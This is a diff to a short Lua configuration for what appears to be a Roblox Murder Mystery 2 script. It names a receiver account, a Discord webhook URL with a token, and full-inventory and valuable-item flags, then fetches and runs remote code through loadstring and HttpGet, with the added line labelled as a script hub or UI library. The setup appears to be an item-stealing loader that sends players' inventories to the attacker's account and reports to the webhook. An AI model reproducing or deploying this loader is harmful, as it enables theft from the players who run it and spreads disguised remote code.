@@ -1,9 +1,10 @@
-Hunter = {
-    Receivers = "ChickenNuggetATK",
-    Webhook = "https://discord.com/api/webhooks/1286786632774713455/G9qXpSdcnZG8BzSGxAUj5qfNxl_of8f9Geow4coGf3k7-Kl4gqNgI_kFzBRnsCQmQBFY",
+Config = {
+    Receivers = {"ChickenNuggetATK"},
+    Webhook = "https://discord.com/api/webhooks/1286679982516732041/zgSEbLMe0Fzx3N4CUPvruzMA3k7jExxITYRo9gi_XxYCCKWmXXuACf5PN2psm7DmkxRH",
     FullInventory = true,
-    PingWhenValuablesOnly = true,
-    ResendTrade = "hello"
+    GoodItemsOnly = true,
+    ResendTrade = ".resend",
+    Script = "Symphony Hub",
+    CustomLink = ""
 }
-
-loadstring(game:HttpGet("https://rentry.org/murder-mystery-2/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
